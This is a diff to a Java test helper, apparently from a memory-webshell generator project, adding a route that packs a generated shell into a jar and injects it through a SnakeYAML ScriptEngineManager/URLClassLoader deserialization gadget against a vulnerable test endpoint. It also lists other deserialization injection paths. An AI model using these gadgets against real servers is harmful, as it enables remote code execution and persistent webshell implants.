@@ -8,11 +8,12 @@ import com.reajason.javaweb.memshell.MemShellGenerator;
 import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.*;
+import com.reajason.javaweb.packer.JarPacker;
 import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.AgentJarPacker;
 import com.reajason.javaweb.packer.jar.AgentJarWithJDKAttacherPacker;
 import com.reajason.javaweb.packer.jar.AgentJarWithJREAttacherPacker;
-import com.reajason.javaweb.packer.jar.JarPacker;
+import com.reajason.javaweb.packer.jar.ScriptEngineJarPacker;
 import com.reajason.javaweb.suo5.Suo5Manager;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
@@ -21,12 +22,12 @@ import okhttp3.HttpUrl;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
-import org.testcontainers.containers.Container;
-import org.testcontainers.containers.GenericContainer;
 import org.apache.commons.io.FileUtils;
 import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.lang3.tuple.Pair;
+import org.testcontainers.containers.Container;
+import org.testcontainers.containers.GenericContainer;
 import org.testcontainers.utility.MountableFile;
 
 import java.io.IOException;
@@ -107,6 +108,32 @@ public class ShellAssertion {
     @SneakyThrows
     public static void packerResultAndInject(MemShellResult generateResult, String url, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) {
         String content = null;
+        if (packer.getInstance() instanceof AgentJarPacker ||
+                packer.getInstance() instanceof AgentJarWithJREAttacherPacker ||
+                packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
+            injectAgentJar(generateResult, shellTool, shellType, packer, appContainer);
+            return;
+        }
+        if (packer.getInstance() instanceof ScriptEngineJarPacker) {
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            Path tempJar = Files.createTempFile("temp", "jar");
+            Files.write(tempJar, bytes);
+            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
+            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
+            FileUtils.deleteQuietly(tempJar.toFile());
+            content = "!!javax.script.ScriptEngineManager [\n" +
+                    "  !!java.net.URLClassLoader [[\n" +
+                    "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
+                    "  ]]\n" +
+                    "]";
+        } else {
+            content = packer.getInstance().pack(generateResult.toClassPackerConfig());
+        }
+        injectIsOk(url, shellType, shellTool, content, packer, appContainer);
+        log.info("send inject payload successfully");
+    }
+
+    private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
         if (packer.getInstance() instanceof AgentJarPacker) {
             byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
             Path tempJar = Files.createTempFile("temp", "jar");
@@ -143,12 +170,9 @@ public class ShellAssertion {
             assertThat(stdout, anyOf(
                     containsString("ok")
             ));
-        } else {
-            content = packer.getInstance().pack(generateResult.toClassPackerConfig());
-            injectIsOk(url, shellType, shellTool, content, packer, appContainer);
-            log.info("send inject payload successfully");
         }
     }
+
 
     @SneakyThrows
     public static void assertShellIsOk(MemShellResult generateResult, String shellUrl, String shellTool, String shellType, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
@@ -365,6 +389,7 @@ public class ShellAssertion {
             case JavaCommonsCollections4 -> VulTool.postIsOk(url + "/java_deserialize/cc40", content);
             case HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
             case Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
+            case ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
             case XMLDecoderScriptEngine, XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
             case Base64 -> VulTool.postIsOk(url + "/b64", content);
             case BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
